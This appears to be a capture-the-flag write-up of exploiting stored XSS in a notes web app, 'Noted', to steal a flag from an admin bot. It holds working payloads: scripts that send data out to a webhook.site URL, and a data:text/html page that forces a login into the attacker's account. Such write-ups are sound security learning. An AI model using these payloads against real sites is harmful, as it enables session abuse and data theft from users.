# Noted

I very quickly saw that I can inject html in the notes. If you put `<script>alert("Hello")</script>` as the note content, it will give you the alert.

Looking at the source code, the report.js seems to be a bot. I am nut 100% sure how js bots work, but it seems ot create a random user with a random pass, and creates a note with the flag in it. The flag coes from an env variable `process.env.FLAG`. And then it opens the url we reposted. 

I neeed to inject some malaciour js in one of my notes, which when the bot will open, will somehow give me the flag. 

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Webhook Request</title>
</head>
<body>

<script>
  const flagValue = encodeURIComponent(process.env.FLAG);
  const webhookUrl = `https://webhook.site/4270872a-9750-4fd3-bfcb-40cc91a258d1/?t=${flagValue}`;

  // Redirect the browser to the webhook URL
  window.location.href = webhookUrl;
</script>

</body>
</html>
```

I uploaded this to 0x0.st, and sent it to the report url. It should have opened, and sent the flag to my webhook url, but it did not work. I guess the app does not have access to the internet, so webhooks and 0x0.st will not work.

I somehow have to get the bot to login into my account, and add the flag to my notes.


Create the following note. It creates a new note with the title as `window.open("", "pico").document.body.textContent`, this will be done only when we open the url with a `/?exploit`. This is done to prevent recursive note creation when we are

```html
<form action="/new" method="POST" id="form">
	<input type="hidden" name="_csrf" value="feh6ty2J-pGJFYvUyRsVmiHJe0zQ37fomL_g">
	<input id="flagHere" type="text" name="title" placeholder="title">
	<br><br>
	<textarea name="content" cols="50" rows="10" placeholder="content"></textarea>
	<br><br>
	<input type="submit" value="Create">
</form>
<script>
if (window.location.search.includes("exploit")){
	var newWindow = window.open("", "pico")
	var bodyText = newWindow.document.body.textContent;
    window.open("http://0.0.0.0:8080/new", "pico");
	document.getElementById("flagHere").value = bodyText;
    setTimeout(function() {form.submit()}, 1000);
}
</script>
```

`data:text/html` is the workaround used to open html without using an external link. This will make the bot login to my admin account, and then open the notes with `?exploit`. This should create a note with the flag as the title.
```html
data:text/html,
<form action="http://0.0.0.0:8080/login" method="POST" id="loginForm" target="_blank">
    <input type="text" name="username" value="admin">
    <input type="text" name="password" value="admin">
</form>

<script>
    const notesURL = "http://0.0.0.0:8080/notes";
    const exploitQueryParam = "exploit";

    window.open(notesURL, "pico");

    setTimeout(function() {
        document.getElementById("loginForm").submit();
    }, 1000);

    setTimeout(function() {
        window.location = notesURL + "?" + exploitQueryParam;
    }, 1000);
</script>
```

Running this we get...
`Only one browser can be open at a time!`

After that didnt work, I read that only the report options does not have acces to the internet, so I mignt be able to use webhooks when viewing notes. Here is that code.

Create a note with this as the content
```html
<script>
  const searchString = "exploit";
  const webhookURL = "https://webhook.site/4270872a-9750-4fd3-bfcb-40cc91a258d1?";

  if (window.location.search.includes(searchString)) {
    const picoWindow = window.open("", "pico");
    const dataContent = picoWindow.document.body.textContent;
    window.location = webhookURL + dataContent;
  }
</script>
```

The report code remains almost the same
```html
data:text/html,
<form action="http://0.0.0.0:8080/login" method="POST" id="loginForm" target="_blank">
    <input type="text" name="username" value="admin">
    <input type="text" name="password" value="admin">
</form>

<script>
    window.open("http://0.0.0.0:8080/notes", "pico");
    setTimeout(function() {document.getElementById("loginForm").submit();}, 1000);
    setTimeout(function() {window.location="http://0.0.0.0:8080/notes?exploit";}, 1000);
</script>
```

